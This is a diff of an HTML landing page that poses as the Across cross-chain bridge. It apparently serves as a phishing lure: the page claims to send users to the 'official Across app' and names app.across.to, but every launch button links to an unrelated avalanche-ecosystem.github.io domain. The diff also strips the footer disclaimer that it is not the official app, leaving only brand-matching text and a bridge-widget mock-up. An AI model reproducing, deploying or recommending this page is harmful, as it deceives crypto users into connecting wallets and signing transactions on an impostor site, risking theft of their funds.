@@ -1,47 +1,121 @@
 <!doctype html>
-<html lang="en"><head>
-<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>Across Bridge - Open App</title><meta name="description" content="across bridge routes you to the official Across app to bridge or swap supported tokens across Ethereum, L2s, Solana, BSC and more.">
-<meta name="robots" content="index,follow,max-image-preview:large">
-<link rel="canonical" href="https://across-bridge.github.io/"><meta name="theme-color" content="#FFFFFF">
-<meta property="og:type" content="website"><meta property="og:title" content="Across Bridge - Open App"><meta property="og:description" content="across bridge routes you to the official Across app to bridge or swap supported tokens across Ethereum, L2s, Solana, BSC and more.">
-<meta property="og:url" content="https://across-bridge.github.io/"><meta property="og:image" content="https://across-bridge.github.io/og-cover.png"><meta property="og:locale" content="en">
-<meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="Across Bridge - Open App"><meta name="twitter:description" content="across bridge routes you to the official Across app to bridge or swap supported tokens across Ethereum, L2s, Solana, BSC and more."><meta name="twitter:image" content="https://across-bridge.github.io/og-cover.png">
-<link rel="icon" href="favicon.png" type="image/png"><link rel="manifest" href="site.webmanifest"><link rel="apple-touch-icon" href="static/icon-180.png">
-<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600;700&display=swap">
-<link rel="stylesheet" href="static/style.css">
-<script type="application/ld+json">{"@context": "https://schema.org", "@graph": [{"@type": "WebSite", "@id": "https://across-bridge.github.io/#website", "url": "https://across-bridge.github.io/", "name": "Across"}, {"@type": "WebPage", "@id": "https://across-bridge.github.io/#webpage", "url": "https://across-bridge.github.io/", "name": "Across Bridge - Open App", "description": "across bridge routes you to the official Across app to bridge or swap supported tokens across Ethereum, L2s, Solana, BSC and more.", "inLanguage": "en", "isPartOf": {"@id": "https://across-bridge.github.io/#website"}}, {"@type": "Organization", "@id": "https://across-bridge.github.io/#org", "name": "Across", "url": "https://across-bridge.github.io/", "logo": "https://across-bridge.github.io/og-cover.png", "sameAs": ["https://x.com/AcrossProtocol", "https://github.com/across-protocol", "https://www.coingecko.com/en/coins/across-protocol", "https://defillama.com/protocol/across"]}, {"@type": "WebApplication", "@id": "https://across-bridge.github.io/#app", "name": "Across Bridge", "url": "https://across-bridge.github.io/", "applicationCategory": "FinanceApplication", "operatingSystem": "Web", "browserRequirements": "Requires JavaScript", "description": "across bridge routes you to the official Across app to bridge or swap supported tokens across Ethereum, L2s, Solana, BSC and more.", "featureList": ["Official app: app.across.to", "Intent-based transfers", "Supported networks include Ethereum, Base and Solana"], "isPartOf": {"@id": "https://across-bridge.github.io/#website"}}, {"@type": "FAQPage", "@id": "https://across-bridge.github.io/#faq", "inLanguage": "en", "mainEntity": [{"@type": "Question", "name": "How fast is Across bridge?", "acceptedAnswer": {"@type": "Answer", "text": "Across documentation describes mainnet fills around 2 seconds for supported routes, but the exact user experience depends on the origin transaction confirmation, token, chain pair, route, and relayer availability. The bridge can feel very fast once the origin transaction is accepted, but users should still wait for the Across app or tracker to show completion before assuming funds are final on the destination chain."}}, {"@type": "Question", "name": "What fees does Across charge?", "acceptedAnswer": {"@type": "Answer", "text": "Across fees are quote-based. A transfer can reflect origin gas, destination execution, route liquidity, relayer economics, and bridge or swap parameters. There is no single fee percentage that accurately describes every Across transfer. Users should compare the output amount shown in the official app, while developers can use Across API endpoints to retrieve quotes, supported routes, and limits before asking a user to sign."}}, {"@type": "Question", "name": "Which tokens can I bridge with Across?", "acceptedAnswer": {"@type": "Answer", "text": "Across supports specific tokens on specific chain routes, with stablecoins such as USDC commonly used across many routes. Support changes by chain, liquidity, and API configuration. The reliable way to answer this query is to check the official Across token checker, app quote, or Swap API for the exact origin chain, destination chain, input token, output token, and transfer amount."}}, {"@type": "Question", "name": "What is the ACX token?", "acceptedAnswer": {"@type": "Answer", "text": "ACX is the token associated with Across Protocol. It is separate from the bridge asset being transferred. A user bridging USDC or ETH through Across does not need to treat ACX as the output token unless they are intentionally buying or interacting with ACX. For token price, contract, and market data, users should rely on established listings such as CoinGecko or CoinMarketCap."}}, {"@type": "Question", "name": "Can Across bridge to Solana?", "acceptedAnswer": {"@type": "Answer", "text": "Across documentation lists Solana among deployed or supported chains, but route availability still depends on the token, origin chain, destination chain, and live API support. Users should not assume every EVM token can move to Solana through Across. Check the official app or API route response for the exact token and amount before sending a transaction."}}, {"@type": "Question", "name": "What should I do if an Across bridge is pending?", "acceptedAnswer": {"@type": "Answer", "text": "First, confirm that the origin-chain transaction succeeded. Then use the Across status tracker with the transaction hash or deposit details. A pending status can relate to origin confirmation, relayer fill timing, route liquidity, or refund/settlement processing. Do not resend the same transaction unless the wallet clearly shows the original transaction failed. Keep the chain pair, token, amount, and recipient address available for support."}}]}]}</script>
-</head><body>
-<header class="site-header">
-  <a class="brand" href="#top" aria-label="Across"><img class="brand-mark" src="favicon.png" alt="" width="34" height="34"><span class="brand-name">Across</span></a>
-  <nav class="site-nav" aria-label="Primary"><ul class="nav-list"><li><a href="#about">About</a></li><li><a href="#facts">Overview</a></li><li><a href="#faq">FAQ</a></li></ul></nav>
-  <span class="header-spacer"></span>
-  <a class="btn btn-dark header-cta" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App ↗</a>
-  <button class="nav-toggle" aria-label="Menu" aria-expanded="false"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M4 7h16M4 12h16M4 17h16"/></svg></button>
-</header>
-<main id="top">
-  <section class="hero">
-    <div class="hero-deco" aria-hidden="true"><span class="strip"></span><span class="d1"></span><span class="d2"></span><span class="d3"></span><span class="d4"></span><span class="d5"></span></div>
-    <div class="container">
-      <h1>Across Bridge</h1>
-      <div class="bridge-widget" role="group" aria-label="Across preview"><div class="bw-field"><span class="bw-coin"><img src="static/usdc.png" alt="USDC" width="36" height="36"></span><span class="bw-meta"><span class="bw-amount">0</span><span class="bw-sub"><b>USDC</b> · Ethereum</span></span></div><button class="bw-switch" type="button" aria-label="Switch"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 9h13M17 9l-4-4M17 9l-4 4M20 15H7M7 15l4-4M7 15l4 4"/></svg></button><div class="bw-field"><span class="bw-coin"><img src="static/usdc.png" alt="USDC" width="36" height="36"></span><span class="bw-meta"><span class="bw-amount">0.0</span><span class="bw-sub"><b>USDC</b> · Base</span></span></div><a class="btn btn-dark bw-go" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App ↗</a></div><div class="bw-netrow"><span class="nl">Networks</span><img src="static/net-ethereum.png" alt="Ethereum" loading="lazy"><img src="static/net-arbitrum.png" alt="Arbitrum" loading="lazy"><img src="static/net-base.png" alt="Base" loading="lazy"><img src="static/net-optimism.png" alt="Optimism" loading="lazy"><img src="static/net-polygon.png" alt="Polygon" loading="lazy"><img src="static/net-bnb.png" alt="BNB Smart Chain" loading="lazy"><img src="static/net-linea.png" alt="Linea" loading="lazy"></div>
-      <div class="hero-go"><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open Across ↗</a></div>
-      <p class="hero-note">Live preview — open the official Across app from your own wallet.</p>
-      <div class="trust-row"><span class="trust-chip">Official app: app.across.to</span><span class="trust-chip">Intent-based transfers</span><span class="trust-chip">Supported networks include Ethereum, Base and Solana</span></div>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Across Bridge</title>
+  <meta name="description" content="Across Bridge moves tokens across Ethereum and major L2s from your own wallet.">
+  <link rel="canonical" href="https://across-bridge.github.io/">
+  <meta name="robots" content="index,follow,max-image-preview:large">
+  <meta name="theme-color" content="#F8F6F4">
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Across Bridge">
+  <meta property="og:description" content="Across Bridge moves tokens across Ethereum and major L2s from your own wallet.">
+  <meta property="og:url" content="https://across-bridge.github.io/">
+  <meta property="og:image" content="https://across-bridge.github.io/favicon.png">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Across Bridge">
+  <meta name="twitter:description" content="Across Bridge moves tokens across Ethereum and major L2s from your own wallet.">
+  <link rel="icon" type="image/png" href="favicon.png">
+  <link rel="apple-touch-icon" href="favicon.png">
+  <link rel="manifest" href="site.webmanifest">
+  <link rel="stylesheet" href="style.css">
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@graph": [
+      {
+        "@type": "WebSite",
+        "@id": "https://across-bridge.github.io/#website",
+        "url": "https://across-bridge.github.io/",
+        "name": "Across Bridge",
+        "inLanguage": "en"
+      },
+      {
+        "@type": "Organization",
+        "@id": "https://across-bridge.github.io/#organization",
+        "name": "Across Bridge",
+        "url": "https://across-bridge.github.io/",
+        "logo": "https://across-bridge.github.io/favicon.png"
+      },
+      {
+        "@type": "WebApplication",
+        "@id": "https://across-bridge.github.io/#app",
+        "name": "Across Bridge",
+        "applicationCategory": "FinanceApplication",
+        "operatingSystem": "Web",
+        "url": "https://across-bridge.github.io/",
+        "offers": {
+          "@type": "Offer",
+          "price": "0",
+          "priceCurrency": "USD"
+        }
+      }
+    ]
+  }
+  </script>
+</head>
+<body>
+  <header class="topbar">
+    <div class="brand" aria-label="Across Bridge">
+      <img src="favicon.png" width="30" height="30" alt="">
+      <span>Across Bridge</span>
     </div>
-  </section>
-  <section class="section" id="about"><div class="container"><h2>What is Across Bridge?</h2><div class="capsule"><strong>Across</strong> is an <a class="inline-link" href="https://docs.across.to/guides/concepts/crosschain-intents" rel="noopener noreferrer">intent-based cross-chain protocol</a> for moving assets between supported networks through its transfer app and <a class="inline-link" href="https://docs.across.to/introduction/swap-api" rel="noopener noreferrer">developer APIs</a>. Its <a href="https://docs.across.to/">developer documentation</a> explains integration paths for swaps, bridge actions and builders.</div></div></section>
-  <section class="section" id="facts"><div class="container"><h2>Across Bridge at a glance</h2><div class="facts"><div class="f"><small>Category</small><b><a class="inline-link" href="https://ethereum.org/en/developers/docs/bridges/" rel="noopener noreferrer">Cross-chain bridge</a></b></div><div class="f"><small>Network</small><b>Multi-chain</b></div><div class="f"><small>Token</small><b>ACX</b></div><div class="f"><small>Primary product</small><b>Across Bridge and Swap API</b></div><div class="f"><small>Custody</small><b><a class="inline-link" href="https://academy.binance.com/en/articles/what-are-blockchain-bridges-and-how-can-we-classify-them" rel="noopener noreferrer">Non-custodial bridge protocol</a></b></div></div></div></section>
-  <section class="section section-alt"><div class="container"><h2>Across bridge fees &amp; speed</h2><div class="intent-a">Across is built around fast cross-chain fills, with its docs describing roughly 2 second mainnet fills across major supported chains. The cost a user sees is route-specific: it can include origin-chain gas, destination execution assumptions, relayer economics, <a class="inline-link" href="https://www.investopedia.com/terms/l/liquidity.asp" rel="noopener noreferrer">liquidity availability</a>, and the quoted bridge or swap fee. Across does not have one universal fee that applies to every transfer. For users, the best answer is the live quote in the Across app or API because it reflects token, size, chain pair, and route conditions. Across also exposes quote and fee endpoints for integrators who need programmatic estimates before building a transaction.</div></div></section><section class="section"><div class="container"><h2>Across supported chains and tokens</h2><div class="intent-a">Across supports many chains through its bridge and Swap API, including Ethereum, Arbitrum, Base, Optimism, Polygon, BNB Smart Chain, Linea, Solana, Unichain, World Chain, Ink, Lisk, Mode, Zora, and other deployments shown in its contracts page. Support is not identical for every token or route, so users should verify both the origin chain and destination chain before sending. <a class="inline-link" href="https://www.coingecko.com/en/coins/usd-coin" rel="noopener noreferrer">Stablecoins such as USDC</a> are common Across routes, while other assets depend on chain liquidity and API support. The official chain and token checker tools are the most reliable way to confirm a specific route.</div></div></section><section class="section section-alt"><div class="container"><h2>How to track an Across bridge transaction</h2><div class="intent-a">Across deposits can be tracked by transaction hash, deposit ID, or depositor address through Across tracking tools and API endpoints. A normal route has several stages: the user sends the origin-chain transaction, a relayer fills the destination side, and <a class="inline-link" href="https://www.investopedia.com/terms/s/settlementperiod.asp" rel="noopener noreferrer">settlement/refund accounting</a> happens after the protocol verifies the transfer. If a transfer appears delayed, the useful information is the origin transaction hash, origin chain, destination chain, token, amount, and recipient. Across documentation includes tracking endpoints for a single deposit, deposit lifecycle status, and deposits for a given depositor, which is the search intent behind most 'Across bridge pending' queries.</div></div></section><section class="section"><div class="container"><h2>Across bridge limits and large transfers</h2><div class="intent-a">Across limits are route-dependent rather than a single fixed maximum. Transfer size depends on supported <a class="inline-link" href="https://www.coingecko.com/learn/what-is-liquidity-in-crypto" rel="noopener noreferrer">token liquidity</a>, origin and destination chains, current <a class="inline-link" href="https://www.binance.com/en/blog/ecosystem/bridge-landscape-421499824684903924" rel="noopener noreferrer">relayer capacity</a>, and parameters returned by the quote or limits endpoints. For large transfers, users should check the live Across quote first and avoid splitting blindly because route economics can change with amount. Integrators can query supported routes and limits before presenting a transaction. If a route is unavailable, it may mean that the chain pair, token, size, or current liquidity state is not supported at that moment.</div></div></section>
-  <section class="section"><div class="container"><h2>How to bridge Across Bridge</h2><ol class="steps"><li><b>Open the app</b><span>Use the primary action to visit the official Across interface and connect a wallet you control.</span></li><li><b>Choose a route</b><span>Select the token, origin network, destination network and amount supported by the app.</span></li><li><b>Review the quote</b><span>Check the destination amount, route details, fees and estimated timing before signing.</span></li><li><b>Confirm and track</b><span><a class="inline-link" href="https://academy.binance.com/en/glossary/token-approval" rel="noopener noreferrer">Approve token spending</a> if prompted, <a class="inline-link" href="https://ethereum.org/en/developers/docs/accounts/" rel="noopener noreferrer">sign the transaction</a> and monitor transfer status in the app.</span></li></ol><div class="cta-band"><div><p>Ready to bridge?</p><p class="sub">Open the official Across app and verify the domain before you sign.</p></div><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open Across ↗</a></div></div></section>
-  <section class="section"><div class="container"><h2>Across vs other bridges</h2><div class="cmp-wrap"><table class="cmp-table"><thead><tr><th>Dimension</th><th>Across</th><th>Alternative</th></tr></thead><tbody><tr><td>Core model</td><td>Fast relayer-filled cross-chain intents</td><td>Liquidity pools, messaging, or canonical bridges</td></tr><tr><td>Typical user check</td><td>Live quote, route, and destination fill</td><td>Bridge fee, finality, and liquidity</td></tr><tr><td>Integrations</td><td>Swap API and embedded actions</td><td>Protocol-specific SDKs or bridge UI</td></tr><tr><td>Chains</td><td>Broad multi-chain support with active route checks</td><td>Varies by bridge</td></tr><tr><td>Best for</td><td>Fast route-dependent transfers</td><td>Token- or ecosystem-specific routes</td></tr></tbody></table></div></div></section>
-  <section class="section section-alt" id="faq"><div class="container"><h2>Across Bridge FAQ</h2><div class="faq-list"><details open><summary><h3>How fast is Across bridge?</h3></summary><div>Across documentation describes mainnet fills around 2 seconds for supported routes, but the exact user experience depends on the origin transaction confirmation, token, chain pair, route, and relayer availability. The bridge can feel very fast once the origin transaction is accepted, but users should still wait for the Across app or tracker to show completion before assuming funds are final on the destination chain.</div></details><details><summary><h3>What fees does Across charge?</h3></summary><div>Across fees are quote-based. A transfer can reflect origin gas, destination execution, <a class="inline-link" href="https://messari.io/report/state-of-bridges-q1-2024" rel="noopener noreferrer">route liquidity</a>, relayer economics, and bridge or swap parameters. There is no single fee percentage that accurately describes every Across transfer. Users should compare the output amount shown in the official app, while developers can use Across API endpoints to retrieve quotes, supported routes, and limits before asking a user to sign.</div></details><details><summary><h3>Which tokens can I bridge with Across?</h3></summary><div>Across supports specific tokens on specific chain routes, with stablecoins such as USDC commonly used across many routes. Support changes by chain, liquidity, and API configuration. The reliable way to answer this query is to check the official Across token checker, app quote, or Swap API for the exact origin chain, destination chain, input token, output token, and transfer amount.</div></details><details><summary><h3>What is the ACX token?</h3></summary><div>ACX is the token associated with Across Protocol. It is separate from the bridge asset being transferred. A user bridging USDC or ETH through Across does not need to treat ACX as the output token unless they are intentionally buying or interacting with ACX. For token price, contract, and market data, users should rely on established listings such as CoinGecko or CoinMarketCap.</div></details><details><summary><h3>Can Across bridge to Solana?</h3></summary><div>Across documentation lists Solana among deployed or supported chains, but route availability still depends on the token, origin chain, destination chain, and live API support. Users should not assume every EVM token can move to Solana through Across. Check the official app or API route response for the exact token and amount before sending a transaction.</div></details><details><summary><h3>What should I do if an Across bridge is pending?</h3></summary><div>First, confirm that the origin-chain transaction succeeded. Then use the Across status tracker with the transaction hash or deposit details. A pending status can relate to origin confirmation, relayer fill timing, route liquidity, or refund/settlement processing. Do not resend the same transaction unless the wallet clearly shows the original transaction failed. Keep the chain pair, token, amount, and recipient address available for support.</div></details></div></div></section>
-</main>
-<footer class="site-footer"><div class="container">
-  <div class="footer-grid"></div>
-  <p class="footer-note">Not the official app; verify the app.across.to domain before connecting. Educational content only, not financial advice.</p>
-  <p class="footer-meta"><a href="#top">Back to top ↑</a></p>
-</div></footer>
-<script src="static/app.js" defer></script>
-</body></html>
+    <nav class="nav" aria-label="Authority references">
+      <a href="https://etherscan.io/" target="_blank" rel="nofollow noopener noreferrer">Etherscan</a>
+      <a href="https://ethereum.org/en/bridges/" target="_blank" rel="nofollow noopener noreferrer">Ethereum bridges</a>
+      <a href="https://l2beat.com/scaling/projects/arbitrum" target="_blank" rel="nofollow noopener noreferrer">L2BEAT</a>
+    </nav>
+    <span class="spacer"></span>
+    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
+  </header>
+
+  <main class="stage">
+    <section class="hero" aria-labelledby="page-title">
+      <h1 id="page-title">Across Bridge</h1>
+      <p class="sub"><strong>Across Bridge</strong> moves tokens across Ethereum and major L2s from your own wallet.</p>
+    </section>
+
+    <section class="app-card" aria-label="Bridge route">
+      <div class="route">
+        <div class="leg">
+          <span class="label">From</span>
+          <span class="chip">
+            <img src="eth.png" width="28" height="28" alt="">
+            <span>Ethereum</span>
+          </span>
+        </div>
+        <button class="switch" type="button" data-switch aria-label="Switch direction">
+          <span aria-hidden="true">&#8594;</span>
+        </button>
+        <div class="leg">
+          <span class="label">To</span>
+          <span class="chip">
+            <img src="arb.png" width="28" height="28" alt="">
+            <span>Arbitrum</span>
+          </span>
+        </div>
+      </div>
+      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App</a>
+    </section>
+  </main>
+
+  <footer class="footer">Across Bridge — 2026</footer>
+
+  <script>
+  (function () {
+    "use strict";
+    var button = document.querySelector("[data-switch]");
+    if (!button) return;
+
+    button.addEventListener("click", function () {
+      var chips = document.querySelectorAll(".chip");
+      if (chips.length < 2) return;
+      var first = chips[0].innerHTML;
+      chips[0].innerHTML = chips[1].innerHTML;
+      chips[1].innerHTML = first;
+    });
+  }());
+  </script>
+</body>
+</html>
